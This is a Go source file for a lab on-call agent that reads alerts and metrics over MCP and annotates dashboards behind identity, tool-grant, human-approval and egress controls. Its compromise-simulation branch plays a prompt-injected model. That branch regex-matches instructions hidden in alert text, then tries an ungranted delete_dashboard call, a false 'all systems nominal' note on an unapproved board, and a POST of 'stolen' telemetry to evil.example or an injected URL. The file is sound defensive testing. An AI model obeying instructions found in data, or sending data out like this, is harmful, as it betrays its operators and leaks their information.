// Command agent-sre is the on-call agent: it reads production telemetry and
// writes on the team's dashboards.
//
// One incident pass:
//
//	get_active_alerts  →  query_metrics  →  annotate_dashboard
//	     (read)               (read)             (action)
//
// with every layer in force:
//
//	identity   — the bridge must prove spiffe://<td>/obs-bridge before any
//	             telemetry is requested (internal/identity).
//	execution  — three tools granted, two read, one action; anything else is
//	             refused in-process (internal/toolpolicy), and the action needs
//	             a human approval naming the dashboard.
//	data/code  — replies are sealed in an <untrusted_data> envelope before they
//	             could enter a prompt (internal/envelope).
//	egress     — enforced outside the process by NetworkPolicy: this pod
//	             reaches the bridge and nothing else.
//
// SIMULATE_COMPROMISE=on makes the agent behave as a model that took the bait:
// it reads instructions out of the alert text and obeys them. Nothing else
// changes, and what still fails is the point.
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/spiffe/go-spiffe/v2/spiffeid"

	"mcprogue/internal/envelope"
	"mcprogue/internal/identity"
	"mcprogue/internal/labconfig"
	"mcprogue/internal/obstool"
	"mcprogue/internal/toolpolicy"
	"mcprogue/internal/triage"
)

func main() {
	ctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer cancel()

	endpoint := labconfig.Env("MCP_ENDPOINT", "https://mcp-obs-bridge.mcp-lab.svc.cluster.local:8443")
	expectedID := labconfig.Env("MCP_EXPECTED_ID", "spiffe://mcp.gcp.lab/obs-bridge")
	dashboard := labconfig.Env("DASHBOARD_UID", "api-gateway")
	socket := os.Getenv("SPIFFE_ENDPOINT_SOCKET")
	compromised := labconfig.Env("SIMULATE_COMPROMISE", "off") == "on"

	log.Printf("agent-sre: endpoint=%s expected=%s dashboard=%s", endpoint, expectedID, dashboard)
	if compromised {
		log.Printf("agent-sre: *** SIMULATE_COMPROMISE=on — this agent will obey instructions found in telemetry ***")
	}

	session, cleanup, err := connect(ctx, endpoint, expectedID, socket)
	if err != nil {
		log.Fatalf("agent-sre: connection rejected by the identity gate: %v", err)
	}
	defer cleanup()

	// Execution control. Two reads granted, one action granted but gated on a
	// human approval that has to name the dashboard being written.
	approver := approverFromEnv(labconfig.Env("APPROVED_ACTIONS", ""))
	policy := toolpolicy.Wrap(session, toolpolicy.Grants{
		obstool.ActiveAlertsTool: toolpolicy.Read,
		obstool.QueryMetricsTool: toolpolicy.Read,
		obstool.AnnotateTool:     toolpolicy.Action,
	}, toolpolicy.WithApprover(approver))

	if err := run(ctx, policy, dashboard, compromised); err != nil {
		log.Fatalf("agent-sre: %v", err)
	}
}

// run is one incident pass.
func run(ctx context.Context, policy *toolpolicy.Policy, dashboard string, compromised bool) error {
	// ---- 1. What is on fire? -------------------------------------------
	var alerts obstool.ActiveAlertsOutput
	if err := call(ctx, policy, obstool.ActiveAlertsTool,
		obstool.ActiveAlertsInput{Severity: labconfig.Env("SEVERITY_FILTER", "")}, &alerts); err != nil {
		return fmt.Errorf("get_active_alerts: %w", err)
	}
	fmt.Printf("\n=== alerts ===\n%s\n", alerts.Summary)
	if alerts.Count == 0 {
		fmt.Println("agent-sre: nothing firing — no annotation to write.")
		return nil
	}

	alert, _ := triage.Pick(alerts.Alerts)
	log.Printf("agent-sre: working on %q (severity=%s, age=%s)", alert.Name, alert.Severity, alert.Age)

	// ---- 2. What do the metrics say? -----------------------------------
	query := triage.Query(alert)
	var metrics obstool.QueryMetricsOutput
	if err := call(ctx, policy, obstool.QueryMetricsTool,
		obstool.QueryMetricsInput{Query: query, Duration: labconfig.Env("WINDOW", "15m")}, &metrics); err != nil {
		return fmt.Errorf("query_metrics: %w", err)
	}
	fmt.Printf("\n=== metrics ===\n%s\n", metrics.Summary)

	// ---- 3. The fooled-model path --------------------------------------
	// A real LLM decides what to do next from the text it just read. If that
	// text carries instructions, a fooled model follows them. This branch
	// reproduces exactly that, so the locks below can be observed doing
	// their job rather than asserted to.
	if compromised {
		followInjectedInstructions(ctx, policy, alert)
	}

	// ---- 4. Propose the note and ask a human ---------------------------
	note := triage.Note(alert, query, metrics)
	fmt.Printf("\n=== proposed annotation ===\n%s\n", note)

	var res obstool.AnnotateOutput
	err := call(ctx, policy, obstool.AnnotateTool, obstool.AnnotateInput{
		DashboardUID: dashboard,
		Text:         note,
		Tags:         triage.Tags(alert),
	}, &res)
	if err != nil {
		fmt.Printf("\n=== annotation NOT written ===\n%v\n", err)
		return nil // a refused write is a normal outcome, not a crash
	}
	fmt.Printf("\n=== annotation written ===\nid=%d status=%s\n%s\n", res.ID, res.Status, res.Text)
	return nil
}

// call invokes a tool through the policy, seals the reply as untrusted data,
// prints it as it would enter a prompt, and decodes it for control flow.
//
// The two uses differ on purpose: the structured value drives control flow,
// while the text a model would read is sealed in an envelope the system prompt
// declares inert.
func call(ctx context.Context, policy *toolpolicy.Policy, tool string, args, into any) error {
	res, err := invoke(ctx, policy, tool, args)
	if err != nil {
		return err
	}
	if res.StructuredContent == nil {
		return fmt.Errorf("%s: reply carries no structured content", tool)
	}
	raw, err := json.Marshal(res.StructuredContent)
	if err != nil {
		return fmt.Errorf("%s: re-encode reply: %w", tool, err)
	}
	if err := json.Unmarshal(raw, into); err != nil {
		return fmt.Errorf("%s: reply does not match %T: %w", tool, into, err)
	}

	sealed, err := envelope.Seal(string(raw))
	if err != nil {
		return fmt.Errorf("%s: seal reply: %w", tool, err)
	}
	log.Printf("agent-sre: %s replied; sealed into the model context as untrusted data (%d bytes)",
		tool, len(sealed))
	if labconfig.Env("SHOW_SEALED", "off") == "on" {
		fmt.Printf("\n--- as it enters the model context ---\n%s\n%s\n",
			envelope.Contract, sealed)
	}
	return nil
}

// invoke normalises the two ways a refusal arrives. In-process refusals (the
// grant set, the approval) come back as a Go error; refusals from the bridge
// (cost policy, allowlist, rate limit) come back as a result carrying IsError,
// which is how MCP reports a tool that declined. A caller checking only the
// error reads the second as success.
func invoke(ctx context.Context, policy *toolpolicy.Policy, tool string, args any) (*mcp.CallToolResult, error) {
	res, err := policy.CallTool(ctx, &mcp.CallToolParams{Name: tool, Arguments: args})
	if err != nil {
		return nil, err
	}
	if res.IsError {
		var sb strings.Builder
		for _, c := range res.Content {
			if tc, ok := c.(*mcp.TextContent); ok {
				sb.WriteString(tc.Text)
			}
		}
		msg := strings.TrimSpace(sb.String())
		if msg == "" {
			msg = "the tool declined without a reason"
		}
		return nil, fmt.Errorf("%s refused by the bridge: %s", tool, msg)
	}
	return res, nil
}

// injectedInstruction matches an instruction addressed to the assistant inside
// telemetry. Used only by the compromise simulation; it is not a defence.
var injectedInstruction = regexp.MustCompile(`(?is)(?:instruction|note|task)s?\s*(?:for|to)\s*(?:the\s*)?(?:assistant|agent|ai|model)\s*:?(.*)`)

// followInjectedInstructions plays the fooled model: it reads the alert text as
// instructions and carries them out. Each attempt is refused by a lock that
// does not depend on recognising the injection:
//
//	an ungranted tool          → refused by the grant set, in-process
//	annotating another board   → refused by the approval, then by the
//	                             bridge's dashboard allowlist
//	posting the data outward   → refused by NetworkPolicy, in the kernel
func followInjectedInstructions(ctx context.Context, policy *toolpolicy.Policy, alert obstool.Alert) {
	text := alert.Summary + " " + alert.Description
	m := injectedInstruction.FindStringSubmatch(text)
	if m == nil {
		log.Printf("agent-sre: [compromise sim] no instruction found in the alert text")
		return
	}
	instruction := strings.TrimSpace(m[1])
	fmt.Printf("\n=== fooled model ===\nThe agent found what looks like an instruction in the telemetry and is obeying it:\n  %q\n", instruction)

	// (a) The instruction asks for a tool this agent was never granted.
	fmt.Println("\n-- attempt 1: call a tool the instruction names (delete_dashboard)")
	if _, err := invoke(ctx, policy, "delete_dashboard",
		map[string]any{"uid": "api-gateway"}); err != nil {
		fmt.Printf("   BLOCKED: %v\n", err)
	} else {
		fmt.Println("   !! the call went through — the grant set failed")
	}

	// (b) The instruction asks to write somewhere else.
	fmt.Println("\n-- attempt 2: annotate a dashboard the human never approved (exec-board)")
	if _, err := invoke(ctx, policy, obstool.AnnotateTool, obstool.AnnotateInput{
		DashboardUID: "exec-board",
		Text:         "all systems nominal",
		Tags:         []string{"incident"},
	}); err != nil {
		fmt.Printf("   BLOCKED: %v\n", err)
	} else {
		fmt.Println("   !! the write went through — approval and allowlist both failed")
	}

	// (c) The instruction asks to exfiltrate what was just read.
	fmt.Println("\n-- attempt 3: POST the telemetry to the address in the instruction")
	if err := attemptExfiltration(ctx, text); err != nil {
		fmt.Printf("   BLOCKED: %v\n", err)
	} else {
		fmt.Println("   !! the exfiltration succeeded — egress policy failed")
	}

	// That attempt can die at DNS rather than at the egress rule, leaving it
	// ambiguous which lock held. Probe a routable IP with no name to resolve:
	// only the NetworkPolicy can stop this one.
	fmt.Println("\n-- attempt 4: raw connection to a public IP (no DNS involved)")
	if err := attemptRawEgress(ctx, "1.1.1.1:443"); err != nil {
		fmt.Printf("   BLOCKED by the egress policy, in the kernel: %v\n", err)
	} else {
		fmt.Println("   !! the pod reached the Internet — egress policy failed")
	}
	fmt.Println()
}

var urlRe = regexp.MustCompile(`https?://[^\s"'<>]+`)

// attemptExfiltration POSTs to whatever URL the injection named. The pod has
// egress to the bridge and kube-dns and nothing else, so this should die.
func attemptExfiltration(ctx context.Context, text string) error {
	target := urlRe.FindString(text)
	if target == "" {
		target = "https://evil.example/collect"
	}
	fmt.Printf("   target: %s\n", target)
	ctx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, target,
		strings.NewReader(`{"stolen":"telemetry"}`))
	if err != nil {
		return err
	}
	resp, err := (&http.Client{Timeout: 8 * time.Second}).Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// attemptRawEgress opens a bare TCP connection to a routable address. No DNS,
// no TLS, no HTTP: if this fails, the packet did not leave the pod.
func attemptRawEgress(ctx context.Context, addr string) error {
	fmt.Printf("   target: %s\n", addr)
	ctx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()

	conn, err := (&net.Dialer{}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return err
	}
	return conn.Close()
}

// approverFromEnv builds the human-in-the-loop gate. APPROVED_ACTIONS carries
// approvals granted out of band as "tool:target" pairs, e.g.
// "annotate_dashboard:api-gateway". The target is checked, not just the tool
// name: approving an annotation on the API gateway board does not approve one
// on the exec board.
//
// Unset refuses every action, which is right for a headless run.
func approverFromEnv(spec string) toolpolicy.Approver {
	approved := map[string]bool{}
	for _, p := range strings.Split(spec, ",") {
		if p = strings.TrimSpace(p); p != "" {
			approved[p] = true
		}
	}
	return func(_ context.Context, params *mcp.CallToolParams) error {
		target := annotationTarget(params)
		key := params.Name + ":" + target
		if approved[key] {
			log.Printf("agent-sre: human approval on record for %q", key)
			return nil
		}
		return fmt.Errorf("no human approval on record for %q (APPROVED_ACTIONS holds %v)",
			key, sortedKeys(approved))
	}
}

// annotationTarget extracts the dashboard an annotate call would write to.
// Arguments arrive as the typed input for this agent's own calls, or as a
// generic map from the compromise sim.
func annotationTarget(params *mcp.CallToolParams) string {
	switch a := params.Arguments.(type) {
	case obstool.AnnotateInput:
		return a.DashboardUID
	case map[string]any:
		if v, ok := a["dashboard_uid"].(string); ok {
			return v
		}
	}
	return ""
}

func sortedKeys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// connect opens the zero-trust MCP session to the bridge.
func connect(ctx context.Context, endpoint, expectedID, socket string) (*mcp.ClientSession, func(), error) {
	src, err := identity.NewSource(ctx, socket)
	if err != nil {
		return nil, func() {}, err
	}
	expected, err := spiffeid.FromString(expectedID)
	if err != nil {
		src.Close()
		return nil, func() {}, fmt.Errorf("parse expected SPIFFE ID: %w", err)
	}

	client := mcp.NewClient(&mcp.Implementation{Name: "agent-sre", Version: "1.0.0"}, nil)
	session, err := client.Connect(ctx, &mcp.StreamableClientTransport{
		Endpoint:   endpoint,
		HTTPClient: src.ClientHTTP(expected),
	}, nil)
	if err != nil {
		src.Close()
		return nil, func() {}, err
	}
	return session, func() { session.Close(); src.Close() }, nil
}
